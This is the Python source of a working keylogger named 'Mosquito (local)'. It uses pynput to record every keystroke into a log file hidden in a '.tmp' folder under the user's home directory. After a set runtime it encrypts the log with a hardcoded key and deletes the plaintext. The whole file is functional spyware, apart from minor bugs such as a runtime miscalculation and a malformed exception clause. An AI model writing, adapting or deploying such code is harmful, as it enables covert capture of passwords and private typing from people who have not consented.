"""
WORKING BUILD - KL for local use. Ends when i say it does
"""
import sys
import os
from threading import Thread
from datetime import datetime
import getpass
from time import sleep
from tkinter import messagebox, Tk, Label
from pynput.keyboard import Listener

FILE_NAME = f"log.txt"
PATH_TO_FILE = ""
RUNTIME = 1 # Measured in hours - enter 0 for unlimited time
ENCRYPT_AT_CLOSE = True
ENCRYPT_KEY = "yrJ45jo-A_s4uxqIm4d1VT4n4uQ_XEsXk9kdqZeAOCo=" # Mira

try:
    from general_encrypt import fernet_encrypt, new_file_extension
except ModuleNotFoundError:
    ENCRYPT_AT_CLOSE = False


#    with open(PATH_TO_FILE, "a") as log:
#        log.write()

def generate_file():
    """ Either creates or opens the log file and writes header info """
    global FILE_NAME
    global PATH_TO_FILE

    if sys.platform == 'linux': # linux
        name = os.getlogin()
        path = f"/home/{name}/.tmp/"
        if not os.path.isdir(path):
            os.makedirs(path)
    else: # Windows
        name = getpass.getuser()
        path = f"C:\\Users\\{name}\\.tmp\\"
        if not os.path.isdir(path):
            os.makedirs(path)

    PATH_TO_FILE = path + FILE_NAME

    if os.path.isfile(PATH_TO_FILE):
        writing_mode = "a"
    else:
        writing_mode = "w"

    rightnow = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(PATH_TO_FILE, writing_mode) as log:
        log.write(f"\t LOG FILE CONTENTS FOR {name} AT {rightnow}\n\n")


def error_popup(message):
    """ gives error message if anything goes wrong """
    decoded_msg = str(message)
    screen = Tk()
    screen.title("Mosquito (local)")
    screen.geometry("200x100")
    welcome_text = Label(text=f'Error: {decoded_msg}')
    welcome_text.pack()

def encrypt(key):
    """ tries basic fernet encrption at end of program (twice) """
    if len(PATH_TO_FILE) == 0:
        exit(1)
    else:

        encrypted_file = new_file_extension(PATH_TO_FILE, '.mira')
        if os.path.isfile(encrypted_file):
            num_of_files = 1
            encrypted_file = encrypted_file + str(num_of_files)            
            while os.path.isfile(encrypted_file):
                encrypted_file = new_file_extension(encrypted_file, ".mira")

            # Method 1 - All in one go.
        with open(PATH_TO_FILE, "rb") as old_log, open(encrypted_file, "wb") as new_log:
            encrypted_data = fernet_encrypt(old_log.read(), key)
            new_log.write(encrypted_data)

        os.remove(PATH_TO_FILE)

        """
            # Method 2 - A line at a time
        with open(PATH_TO_FILE, "rb") as old_log, open(PATH_TO_FILE, "wb") as new_log:
            for line in old_log:
                new_log.write(fernet_encrypt(line, key) + b'\n')
        """

def write_to_file(key):
    """ writes key to log and cases out exceptions """
    character = str(key)
    character = character.replace("'", "")
    if len(character) == 1:
        pass
    if character == "Key.space":
        character = " "
    elif character == "Key.enter":
        character = "\n"
    elif character == "Key.shift_r" or character == "Key.shift_l" or character == "Key.shift":
        character = ""
    elif character == "Key.ctrl_l" or character == "Key.ctrl_r" or character == "Key.ctrl":
        character = "^"
    elif character == "Key.backspace":
        character = "-"
    elif character == "Key.tab":
        character = "(tab)"
    elif character == "Key.up":
        character = "" #"(up)"
    elif character == "Key.down":
        character = "" #"(down)"
    elif character == "Key.left":
        character =""# "(left)"
    elif character == "Key.right":
        character = "" #"(right)"
    elif character == "Key.caps_lock":
        character = ""
    elif character == "Key.esc":
        character = "(esc)"
    elif character == "Key.alt" or character == "key.alt_l" or character == "key.alt_r":
        character = "alt+"
    #elif character == "Key.insert":
    #    character = "(insert)"
    elif character == "Key.delete":
        character = "" #"(del)"

    # since at this point in the code it is established that
    # the file is open an can be written to, there should be
    # no errors here
    with open(PATH_TO_FILE, 'a') as log:
        log.write(character)


def main():
    """ sends keystrokes to local log file """

    try:
        generate_file()

        with Listener(on_press=write_to_file) as listen:
            listen.join()

    except PermissionError as err_msg:
        error_popup(err_msg)
    except KeyboardInterrupt:
        exit(0)
    except Exception as err_msg:
        error_popup(err_msg)


main_thread = Thread(target=main)
main_thread.daemon = True
main_thread.start()

if RUNTIME == 0:
    while True:
        pass
    """
    start = list(map(int, datetime.now().strftime('%Y %m %d').split(' ')))
    startint = start[0]*365 + start[1]*31 + start[2]
    nowint = 1
    while nowint != startint:
        pass
    """

elif RUNTIME < 0:
    messagebox.showinfo("Error", "RUNTIME set to invalid time.")
    exit(1)
else:
    sleep(RUNTIME*15)
    #sleep(3600*RUNTIME)

if ENCRYPT_AT_CLOSE:
    try:
        encrypt(ENCRYPT_KEY)
    except PermissionError or FileNotFoundError or ValueError as e:
        with open(PATH_TO_FILE) as log:
            log.write('\nFailed Encryption: ' + str(e))
